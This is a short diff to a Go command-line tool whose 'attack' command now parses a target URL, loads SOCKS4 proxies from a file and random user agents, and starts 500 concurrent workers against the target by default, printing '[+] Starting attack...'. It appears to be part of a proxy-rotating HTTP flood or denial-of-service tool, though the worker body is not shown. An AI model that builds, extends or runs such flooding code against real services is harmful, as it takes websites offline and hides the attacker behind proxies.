@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"net/url"
 	"time"
 
 	"github.com/mkideal/cli"
@@ -9,8 +10,8 @@ import (
 
 type runT struct {
 	cli.Helper
-	Host     string `cli:"*host"`
-	Worker   int    `cli:"w,worker" dft:"500"`
+	Url      string `cli:"*url"`
+	Worker   int    `cli:"w,workers" dft:"500"`
 	File     string `cli:"f,file" dft:"socks4.txt"`
 	Duration int    `cli:"d,duration" dft:"10"`
 }
@@ -25,11 +26,16 @@ var attackCommand = &cli.Command{
 		argv := ctx.Argv().(*runT)
 		useragents := getUserAgents(500)
 		proxies := readLines(argv.File)
+		u, err := url.Parse(argv.Url)
+
+		if err != nil {
+			return err
+		}
 
 		fmt.Println("[+] Starting attack...")
 
 		for i := 0; i < argv.Worker; i++ {
-			go worker(argv.Host, useragents, proxies)
+			go worker(u, useragents, proxies)
 		}
 
 		time.Sleep(time.Duration(argv.Duration) * time.Second)
